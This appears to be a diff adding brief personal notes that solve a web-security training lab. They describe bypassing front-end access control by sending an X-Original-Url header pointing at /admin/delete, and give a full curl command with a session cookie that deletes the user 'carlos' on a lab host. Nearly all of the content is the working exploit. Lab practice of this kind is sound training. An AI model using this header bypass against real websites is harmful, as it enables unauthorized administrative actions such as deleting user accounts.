@@ -1,0 +1,8 @@
+
+X-Original-Url: /admin
+
+add this headers:
+	X-Original-Url: /admin/delete
+
+curl -ik -H $'X-Original-Url: /admin/delete' -b $'session=pwVYMJQOU10y62kWfpM8EhnLjCqgTgXC' \
+    $'https://0ad500020477697081a38aea009c00be.web-security-academy.net/?username=carlos'
